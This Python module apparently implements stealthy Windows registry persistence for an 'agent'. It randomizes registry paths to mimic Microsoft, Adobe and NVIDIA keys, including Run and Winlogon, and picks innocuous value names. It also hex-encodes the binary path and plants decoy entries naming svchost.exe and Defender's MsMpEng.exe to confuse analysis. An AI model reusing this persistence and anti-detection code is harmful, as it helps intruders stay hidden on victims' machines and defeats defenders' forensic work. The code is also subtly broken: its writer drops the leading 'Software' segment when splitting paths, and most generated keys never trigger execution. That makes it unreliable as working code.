"""
Registry Randomization Engine
Implements randomized registry paths for agent persistence (Priority 1)
Prevents detection via hardcoded registry paths like Software\Policies\Microsoft
"""

import os
import random
import hashlib
import secrets
from typing import Dict, Tuple, Optional
from pathlib import Path
import logging
import json

logger = logging.getLogger(__name__)


class RegistryRandomizationEngine:
    """
    Manages randomized registry paths for persistent agent presence.
    
    Core Capability:
    - Generates randomized registry paths (not hardcoded Software\Policies\Microsoft)
    - Creates multiple decoy registry entries
    - Supports seed-based recovery for path reconstruction
    - Integrates with Windows registry writes via ctypes
    """
    
    # Common legitimate registry paths for mimicry
    LEGITIMATE_PATHS = [
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        "Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
        "Software\\Microsoft\\Office\\16.0\\Common",
        "Software\\Microsoft\\OneDrive",
        "Software\\Microsoft\\Internet Explorer",
        "Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion",
        "Software\\Classes\\File",
    ]
    
    def __init__(self, seed: Optional[str] = None):
        """
        Initialize registry randomization engine.
        
        Args:
            seed: Optional seed for deterministic path generation
        """
        self.seed = seed or secrets.token_hex(16)
        self.registry_root = "HKCU"
        self.decoy_entries = {}
        
    def generate_randomized_registry_path(self) -> str:
        """
        Generate a randomized registry path that mimics legitimate software paths.
        
        Returns difficult-to-detect paths like:
        - Software\\Microsoft\\WindowsUpdate\\Cache
        - Software\\Microsoft\\Internet Explorer\\InternetRegistry
        - Software\\{random_guid}
        
        Returns:
            Randomized registry path string
        """
        choice = random.randint(0, 3)
        
        if choice == 0:
            # Mimic Windows Update or system component
            subpaths = [
                "Software\\Microsoft\\Windows\\CurrentVersion\\WindowsUpdate\\Cache",
                "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
                "Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings",
            ]
            return random.choice(subpaths)
        
        elif choice == 1:
            # Random GUID-like path
            guid_part = hashlib.md5(self.seed.encode()).hexdigest()[:8].upper()
            return f"Software\\Microsoft\\{{0x{guid_part}-Registry-Entry}}"
        
        elif choice == 2:
            # Nested legitimate-looking path
            base = random.choice(self.LEGITIMATE_PATHS)
            subkey = secrets.token_hex(4)
            return f"{base}\\{subkey}"
        
        else:
            # Mimic OEM/vendor path
            vendors = ["Adobe", "GenuineIntel", "NVIDIA", "Intel"]
            vendor = random.choice(vendors)
            return f"Software\\{vendor}\\{secrets.token_hex(4)}"
    
    def generate_randomized_value_name(self) -> str:
        """
        Generate randomized registry value name (not "AgentPath" or obvious names).
        
        Returns:
            Randomized value name like "DisplayVersion", "Version", "Build"
        """
        legit_names = [
            "DisplayVersion",
            "Version",
            "Build",
            "Install",
            "Update",
            "Cache",
            "Temp",
            "Config",
            "Settings",
            "Preferences",
            "Data",
        ]
        return random.choice(legit_names)
    
    def create_registry_persistence_entry(self, binary_path: str, value_name: Optional[str] = None) -> Dict:
        """
        Create a registry persistence entry configuration.
        
        Args:
            binary_path: Path to binary to execute
            value_name: Optional custom value name
            
        Returns:
            Dictionary with registry entry details
        """
        registry_path = self.generate_randomized_registry_path()
        if value_name is None:
            value_name = self.generate_randomized_value_name()
        
        # Encode binary path in hex to avoid plaintext reference
        encoded_path = binary_path.encode().hex()
        
        entry = {
            "registry_path": registry_path,
            "registry_root": self.registry_root,
            "value_name": value_name,
            "binary_path": binary_path,
            "encoded_path": encoded_path,
            "value_type": "REG_SZ",
            "seed": self.seed,
        }
        
        return entry
    
    def create_decoy_registry_entries(self, count: int = 5) -> Dict[str, Dict]:
        """
        Create multiple decoy registry entries to confuse analysis.
        
        These fake entries point to nonexistent or legitimate executables.
        
        Args:
            count: Number of decoy entries to create
            
        Returns:
            Dictionary mapping entry IDs to entry configurations
        """
        decoys = {}
        
        for i in range(count):
            # Create fake binary paths
            if i == 0:
                fake_path = "C:\\Windows\\System32\\svchost.exe"
            elif i == 1:
                fake_path = "C:\\Program Files\\Windows Defender\\MsMpEng.exe"
            else:
                fake_path = f"C:\\fake_path_{i}\\binary.exe"
            
            entry = self.create_registry_persistence_entry(fake_path, f"Decoy_{i}")
            decoys[f"decoy_{i}"] = entry
        
        self.decoy_entries = decoys
        return decoys
    
    def get_recovery_config(self) -> Dict:
        """
        Get configuration for recovery of registry paths.
        
        Returns:
            Dictionary with all registry entry configurations
        """
        return {
            "seed": self.seed,
            "registry_root": self.registry_root,
            "decoys": self.decoy_entries,
        }


class RegistryPersistenceWriter:
    """
    Handles actual registry writes (Windows-specific).
    Uses ctypes for direct registry manipulation.
    """
    
    def __init__(self):
        """Initialize registry writer."""
        try:
            import winreg
            self.winreg = winreg
            self.available = True
        except ImportError:
            self.available = False
            logger.warning("winreg not available - registry operations will be simulated")
    
    def write_registry_entry(self, entry: Dict) -> bool:
        """
        Write a registry entry using generated configuration.
        
        Args:
            entry: Registry entry configuration from RegistryRandomizationEngine
            
        Returns:
            True if successful, False otherwise
        """
        if not self.available:
            logger.info(f"[SIMULATED] Registry write to {entry['registry_path']}\\{entry['value_name']}")
            return True
        
        try:
            import winreg
            
            # Parse registry path
            root_name, path = entry['registry_path'].split('\\', 1)
            
            # Map root names to winreg constants
            roots = {
                'HKCU': winreg.HKEY_CURRENT_USER,
                'HKLM': winreg.HKEY_LOCAL_MACHINE,
                'HCC': winreg.HKEY_CURRENT_CONFIG,
            }
            
            if entry['registry_root'] not in roots:
                logger.error(f"Unknown registry root: {entry['registry_root']}")
                return False
            
            root_key = roots[entry['registry_root']]
            
            # Create or open registry key
            try:
                key = winreg.CreateKey(root_key, path)
                winreg.SetValueEx(
                    key,
                    entry['value_name'],
                    0,
                    winreg.REG_SZ,
                    entry['binary_path']
                )
                winreg.CloseKey(key)
                logger.info(f"Registry entry written: {path}\\{entry['value_name']}")
                return True
            except Exception as e:
                logger.error(f"Failed to write registry entry: {e}")
                return False
        
        except Exception as e:
            logger.error(f"Registry operation error: {e}")
            return False
    
    def delete_registry_entry(self, entry: Dict) -> bool:
        """
        Delete a registry entry to clean up.
        
        Args:
            entry: Registry entry configuration
            
        Returns:
            True if successful, False otherwise
        """
        if not self.available:
            logger.info(f"[SIMULATED] Registry delete from {entry['registry_path']}\\{entry['value_name']}")
            return True
        
        try:
            import winreg
            
            root_name, path = entry['registry_path'].split('\\', 1)
            roots = {
                'HKCU': winreg.HKEY_CURRENT_USER,
                'HKLM': winreg.HKEY_LOCAL_MACHINE,
            }
            
            root_key = roots[entry['registry_root']]
            key = winreg.OpenKey(root_key, path)
            winreg.DeleteValue(key, entry['value_name'])
            winreg.CloseKey(key)
            
            logger.info(f"Registry entry deleted: {path}\\{entry['value_name']}")
            return True
        except Exception as e:
            logger.error(f"Failed to delete registry entry: {e}")
            return False


# Example integration
if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    
    # Generate randomized registry paths
    engine = RegistryRandomizationEngine()
    
    # Create primary persistence entry
    primary_entry = engine.create_registry_persistence_entry("C:\\agent.exe")
    print(f"Primary registry entry:\n{json.dumps(primary_entry, indent=2)}\n")
    
    # Create decoy entries
    decoys = engine.create_decoy_registry_entries(count=5)
    print(f"Created {len(decoys)} decoy entries")
    
    # Write to registry (if available)
    writer = RegistryPersistenceWriter()
    result = writer.write_registry_entry(primary_entry)
    print(f"Registry write result: {result}")
